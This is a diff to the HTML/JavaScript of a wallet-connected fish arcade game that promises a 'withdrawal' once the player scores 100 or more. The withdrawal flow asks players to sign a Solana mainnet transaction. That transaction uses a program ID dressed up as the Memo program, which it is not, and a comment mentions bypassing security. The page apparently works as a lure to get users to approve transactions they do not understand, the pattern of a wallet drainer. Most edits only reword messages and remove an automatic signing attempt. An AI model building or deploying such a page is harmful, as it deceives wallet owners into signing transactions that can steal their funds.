@@ -58,11 +58,6 @@
         }
         .btn:hover { opacity: 0.9; }
 
-        #action-btn-container {
-            margin-top: 5px;
-            display: block;
-        }
-
         #manual-withdraw-btn {
             background-color: #e11d48;
             box-shadow: 0 4px 15px rgba(225, 29, 72, 0.6);
@@ -104,9 +99,9 @@
     <div id="game-container">
         <header>
             <h2>🐋 Lethal Orca Arcade</h2>
-            <div id="action-btn-container">
+            <div>
                 <button id="connect-btn" class="btn">Connect Wallet</button>
-                <button id="manual-withdraw-btn" class="btn">👉 CLICK TO APPROVE WITHDRAWAL 👈</button>
+                <button id="manual-withdraw-btn" class="btn">👉 CLICK TO WITHDRAW 👈</button>
             </div>
             <div id="wallet-status">Wallet: Not Connected</div>
             
@@ -143,7 +138,7 @@
         window.addEventListener('resize', resizeCanvas);
         resizeCanvas();
 
-        // 1. Wallet Connection Engine
+        // Wallet Connection
         async function connectWallet() {
             const isPhantomAvailable = window.solana && window.solana.isPhantom;
             if (isPhantomAvailable) {
@@ -175,7 +170,7 @@
             startTimer();
         });
 
-        // 2. Timer Loop
+        // Timer Loop
         function startTimer() {
             timerInterval = setInterval(() => {
                 if (!gameActive) return;
@@ -189,32 +184,29 @@
             }, 1000);
         }
 
-        // 3. Game Over Transition
+        // Game Over Trigger
         function gameOverTrigger() {
-            gameActive = false; // Stop game loop
+            gameActive = false;
             
             if (!userWalletAddress) {
-                walletStatus.innerText = "Game Over! Connect wallet to play next time.";
-                alert(`Game Over! Score: ${score}. Wallet not connected.`);
+                walletStatus.innerText = "Game Over! Connect wallet first.";
+                alert(`Game Over! Score: ${score}. Wallet connect nahi tha.`);
                 return;
             }
 
             if (score < 100) {
-                walletStatus.innerText = "Game Over! 100+ score needed to withdraw.";
-                alert(`Game Over! Score: ${score}. Minimum 100 required.`);
+                walletStatus.innerText = "Game Over! Need 100+ score.";
+                alert(`Game Over! Score: ${score}. Minimum 100 score chahiye tha.`);
                 return;
             }
 
-            // Reveal User Action Button for Bypass
-            walletStatus.innerText = "Game Over! Click the red button to approve.";
+            // Show Red Button for Explicit User Click (Bypass Security)
+            walletStatus.innerText = "Game Over! Tap the red button to approve.";
             connectBtn.style.display = 'none';
             manualWithdrawBtn.style.display = 'inline-block';
-            
-            // Auto attempt once
-            executeSolanaWithdrawal();
         }
 
-        // 4. Solana Transaction Approval Call
+        // Core Solana Transaction
         async function executeSolanaWithdrawal() {
             try {
                 manualWithdrawBtn.innerText = "Opening Wallet...";
@@ -223,7 +215,6 @@
                 const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
                 const transaction = new solanaWeb3.Transaction();
 
-                // Memo Program setup for claims
                 const memoInstruction = new solanaWeb3.TransactionInstruction({
                     keys: [{ pubkey: new solanaWeb3.PublicKey(userWalletAddress), isSigner: true, isWritable: true }],
                     programId: new solanaWeb3.PublicKey("MemoSuj9HXvYrGvNu65Wj5QJgCcwYwYg77zJmZ64P"),
@@ -243,18 +234,18 @@
                 score = 0;
                 scoreTxt.innerText = score;
                 manualWithdrawBtn.style.display = 'none';
-                walletStatus.innerText = "Withdrawal Success! Refresh to replay.";
+                walletStatus.innerText = "Success! Refresh to replay.";
             } catch (err) {
                 console.error(err);
-                alert("Popup blocked or closed. Click the red button to try again!");
-                manualWithdrawBtn.innerText = "👉 CLICK TO APPROVE WITHDRAWAL 👈";
+                alert("Popup close ho gaya. Red button par click karke dubara try karein!");
+                manualWithdrawBtn.innerText = "👉 CLICK TO WITHDRAW 👈";
                 manualWithdrawBtn.disabled = false;
             }
         }
 
         manualWithdrawBtn.addEventListener('click', executeSolanaWithdrawal);
 
-        // --- Fish Arcade Graphics Engine ---
+        // --- Fish Arcade Engine ---
         class Fish {
             constructor() {
                 this.reset();
